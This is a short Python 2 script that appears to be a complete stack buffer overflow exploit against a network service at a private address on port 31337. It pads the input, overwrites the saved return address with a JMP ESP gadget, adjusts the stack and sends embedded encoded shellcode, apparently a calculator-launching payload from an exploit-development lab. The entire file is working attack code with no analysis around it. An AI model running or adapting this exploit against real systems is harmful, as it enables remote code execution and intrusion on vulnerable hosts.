#!/usr/bin/env python2
import socket
import struct

# set up the IP and port we're connecting to
RHOST = "192.168.205.170"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build payload followed by a newline
trigger = 1024
offset = 146

jmpesp = 0x080414C3

sub_esp_10="\x83\xec\x10"

calc =  ""
calc += "\xda\xd5\xd9\x74\x24\xf4\xb8\xae\xa9\x7c\xb3\x5e\x29"
calc += "\xc9\xb1\x31\x31\x46\x18\x03\x46\x18\x83\xc6\xaa\x4b"
calc += "\x89\x4f\x5a\x09\x72\xb0\x9a\x6e\xfa\x55\xab\xae\x98"
calc += "\x1e\x9b\x1e\xea\x73\x17\xd4\xbe\x67\xac\x98\x16\x87"
calc += "\x05\x16\x41\xa6\x96\x0b\xb1\xa9\x14\x56\xe6\x09\x25"
calc += "\x99\xfb\x48\x62\xc4\xf6\x19\x3b\x82\xa5\x8d\x48\xde"
calc += "\x75\x25\x02\xce\xfd\xda\xd2\xf1\x2c\x4d\x69\xa8\xee"
calc += "\x6f\xbe\xc0\xa6\x77\xa3\xed\x71\x03\x17\x99\x83\xc5"
calc += "\x66\x62\x2f\x28\x47\x91\x31\x6c\x6f\x4a\x44\x84\x8c"
calc += "\xf7\x5f\x53\xef\x23\xd5\x40\x57\xa7\x4d\xad\x66\x64"
calc += "\x0b\x26\x64\xc1\x5f\x60\x68\xd4\x8c\x1a\x94\x5d\x33"
calc += "\xcd\x1d\x25\x10\xc9\x46\xfd\x39\x48\x22\x50\x45\x8a"
calc += "\x8d\x0d\xe3\xc0\x23\x59\x9e\x8a\x29\x9c\x2c\xb1\x1f"
calc += "\x9e\x2e\xba\x0f\xf7\x1f\x31\xc0\x80\x9f\x90\xa5\x6f"
calc += "\x42\x31\xd3\x07\xdb\xd0\x5e\x4a\xdc\x0e\x9c\x73\x5f"
calc += "\xbb\x5c\x80\x7f\xce\x59\xcc\xc7\x22\x13\x5d\xa2\x44"
calc += "\x80\x5e\xe7\x26\x47\xcd\x6b\x87\xe2\x75\x09\xd7"

buf = ""
buf += "A" * (offset - len(buf))	  # padding
buf += struct.pack("<I", jmpesp)		# SRP/EIP overwrite
buf += sub_esp_10	                  # ESP points here
buf += calc
buf += "D" * (trigger - len(buf))	  # trailing padding
buf += "\n"

# send payload down the socket
s.send(buf)

# print out what we sent
print "Sent: {0}".format(buf)

# receive some data from the socket
resp = s.recv(1024)

# print out what we received
print "Received: {0}".format(resp)
